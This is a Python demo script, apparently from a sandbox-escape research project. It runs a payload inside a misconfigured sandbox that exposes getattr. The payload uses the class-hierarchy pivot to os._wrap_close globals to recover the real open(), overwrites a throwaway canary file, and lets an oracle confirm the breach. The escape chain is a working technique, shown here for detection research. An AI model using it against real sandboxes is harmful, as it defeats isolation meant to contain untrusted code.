"""Live demonstration script for the Professor:

Empirically executes a payload that escapes the sandbox, modifies the canary file
on disk, and has the EscapeOracle detect and confirm the breach.
"""

from __future__ import annotations

import sys
from pathlib import Path

from sandbox_escape_finder.misconfigured_sandboxes import sandbox_exec_exposed_getattr_builtin
from sandbox_escape_finder.oracle import EscapeOracle, capture_canary_state, oracle


def main() -> None:
    print("=" * 68)
    print("DEMO: PAYLOAD CORRUPTING CANARY FILE & ESCAPING SANDBOX")
    print("=" * 68)

    # 1. Setup the throwaway canary environment
    with EscapeOracle() as oracle_fixture:
        canary_path = oracle_fixture.canary_path
        assert canary_path is not None

        print(f"\n[STEP 1] Setup Canary Fixture on Disk:")
        print(f"         Path:    {canary_path}")
        initial_content = canary_path.read_text(encoding="utf-8")
        print(f"         Content Before Execution: '{initial_content}'")

        # 2. Capture baseline canary state
        pre_state = capture_canary_state(canary_path)

        # 3. The Escape Payload:
        # Uses getattr() to pivot through class hierarchy:
        # int -> object -> os._wrap_close -> __globals__ -> unrestricted __builtins__['open']
        escape_payload = (
            "object_type = getattr(int, '__base__')\n"
            "classes = getattr(object_type, '__subclasses__')()\n"
            "wrap_close = [c for c in classes if 'wrap_close' in str(c)][0]\n"
            "init_fn = getattr(wrap_close, '__init__')\n"
            "real_globals = getattr(init_fn, '__globals__')\n"
            "real_builtins = real_globals['__builtins__']\n"
            "real_open = real_builtins['open']\n"
            f"with real_open(r'{canary_path}', 'w') as f:\n"
            "    f.write('PWNED_VIA_EXPOSED_GETATTR')\n"
        )

        print(f"\n[STEP 2] Executing Escape Payload inside Isolated Subprocess...")
        result = sandbox_exec_exposed_getattr_builtin(
            escape_payload,
            timeout=3.0,
            work_dir=canary_path.parent,
        )

        # 4. Capture post-execution canary state
        post_state = capture_canary_state(canary_path)

        # 5. Oracle Evaluation
        escaped_verdict = oracle(pre_state, result, post_state)

        # 6. Verify Content Directly on Disk
        final_content = canary_path.read_text(encoding="utf-8")

        print(f"\n[STEP 3] Oracle Verification & Inspection:")
        print(f"         Subprocess Executed Cleanly: {result['executed']}")
        print(f"         Execution Exception:         {result['exception']}")
        print(f"         Capability Recovered:        {result['capability_recovered']}")
        print(f"         Oracle Breach Detected:      {escaped_verdict}")

        print(f"\n[STEP 4] On-Disk Canary File Verification:")
        print(f"         Content After Execution:  '{final_content}'")
        print(f"         File Tampered / Corrupted: {initial_content != final_content}")

        print("\n" + "=" * 68)
        if escaped_verdict and final_content == "PWNED_VIA_EXPOSED_GETATTR":
            print("SUCCESS: Canary file was corrupted on disk and oracle confirmed escape!")
        else:
            print("FAILURE: Canary was not modified.")
        print("=" * 68)


if __name__ == "__main__":
    main()

